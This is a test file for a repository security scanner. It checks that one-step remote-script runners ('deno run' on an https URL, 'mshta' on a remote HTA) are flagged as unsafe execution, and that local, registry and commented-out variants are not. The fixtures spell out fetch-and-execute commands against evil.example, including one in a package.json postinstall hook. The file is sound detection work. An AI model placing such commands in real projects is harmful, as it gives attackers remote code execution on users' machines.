import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * Some commands fetch and execute a remote script in a single step:
 * `deno run` treats an http(s) specifier as a remote module, and
 * `mshta` executes a remote HTA. No pipe, no downloaded file and no
 * download record ever appears, so the pipe rules and the download
 * inventory both missed them.
 */
const RUNNERS: Record<string, { path: string; body: string }> = {
  "deno run URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --allow-all https://evil.example/x.ts",
  },
  "deno run quoted URL": {
    path: "scripts/bootstrap.sh",
    body: 'deno run "https://evil.example/x.ts"',
  },
  "deno run -A URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run -A https://evil.example/x.ts",
  },
  "deno run --allow-net URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --allow-net https://evil.example/x.ts",
  },
  "deno run several permission flags URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --allow-env --allow-net https://evil.example/x.ts",
  },
  "deno run --allow-net with a host list URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --allow-net=evil.example https://evil.example/x.ts",
  },
  "deno run -A then --allow-net URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run -A --allow-net https://evil.example/x.ts",
  },
  "deno run --unstable URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --unstable https://evil.example/x.ts",
  },
  "deno run -N URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run -N https://evil.example/x.ts",
  },
  "deno run -N with a host list URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run -N=evil.example https://evil.example/x.ts",
  },
  "deno run --allow-import then --allow-net URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --allow-import --allow-net https://evil.example/x.ts",
  },
  "deno run -q then --allow-net URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run -q --allow-net https://evil.example/x.ts",
  },
  "deno run --no-check then --allow-net URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --no-check --allow-net https://evil.example/x.ts",
  },
  "deno run --reload then --allow-net URL": {
    path: "scripts/bootstrap.sh",
    body: "deno run --reload --allow-net https://evil.example/x.ts",
  },
  "deno run --allow-net URL in a deno.json task": {
    path: "deno.json",
    body: '{"tasks":{"setup":"deno run --allow-net https://evil.example/x.ts"}}',
  },
  "deno run URL in a deno.json task": {
    path: "deno.json",
    body: '{"tasks":{"setup":"deno run --allow-all https://evil.example/x.ts"}}',
  },
  "deno run URL in a postinstall hook": {
    path: "package.json",
    body: '{"scripts":{"postinstall":"deno run --allow-all https://evil.example/x.ts"}}',
  },
  "mshta URL": {
    path: "scripts/bootstrap.bat",
    body: "mshta https://evil.example/x.hta",
  },
  "mshta.exe URL": {
    path: "scripts/bootstrap.ps1",
    body: "mshta.exe https://evil.example/x.hta",
  },
};

test("a command that runs a remote script URL directly is unsafe execution", () => {
  for (const [name, { path, body }] of Object.entries(RUNNERS)) {
    const inspection = inspectRepository({
      files: [{ path, bytes: new TextEncoder().encode(`${body}\n`) }],
    });
    // A hook command is checked as file text and again as a hook, the
    // same pair the pipe rules already produce for a `curl | sh`
    // postinstall; every other case reports the file alone.
    const expected =
      path === "package.json"
        ? [
            "package.json:unsafe-execution:high",
            "package.json#scripts:unsafe-execution:high",
          ]
        : [`${path}:unsafe-execution:high`];
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ name, findings: expected });
  }
});

test("running local or registry content keeps no unsafe-execution finding", () => {
  for (const { path, body } of [
    // A local file is reviewed content in the same repository.
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --allow-all ./scripts/local.ts",
    },
    { path: "scripts/bootstrap.sh", body: "bun run ./scripts/setup.ts" },
    // A registry specifier is dependency content, not a script URL.
    { path: "scripts/bootstrap.sh", body: "deno run npm:typescript@5.6.3/tsc" },
    { path: "deno.json", body: '{"tasks":{"setup":"deno run ./local.ts"}}' },
    {
      path: "scripts/bootstrap.sh",
      body: "deno run ./local.ts https://api.example/data",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --config https://example.com/deno.json ./local.ts",
    },
    // A permission flag does not move the target: the URL after a local
    // script is still script data, and a registry specifier is still
    // dependency content.
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --allow-net ./local.ts https://api.example/data",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --allow-net npm:typescript@5.6.3/tsc",
    },
    // --no-remote forbids the fetch, so the URL cannot execute.
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --no-remote https://example.com/module.ts",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --help https://example.com/module.ts",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "deno run -N ./local.ts https://api.example/data",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "deno run --no-check --no-remote https://example.com/module.ts",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "# deno run https://example.com/module.ts",
    },
    {
      path: "scripts/bootstrap.sh",
      body: "echo deno run https://example.com/module.ts",
    },
    {
      path: "scripts/bootstrap.ts",
      body: "// deno run https://example.com/module.ts",
    },
    {
      path: "scripts/bootstrap.bat",
      body: "REM mshta https://example.com/app.hta",
    },
    {
      path: "scripts/bootstrap.ps1",
      body: "# mshta https://example.com/app.hta",
    },
    {
      path: "scripts/bootstrap.bat",
      body: "mshta local.hta https://api.example/data",
    },
    // mshta on a local file fetches nothing.
    { path: "scripts/bootstrap.bat", body: "mshta local.hta" },
  ]) {
    const inspection = inspectRepository({
      files: [{ path, bytes: new TextEncoder().encode(`${body}\n`) }],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});
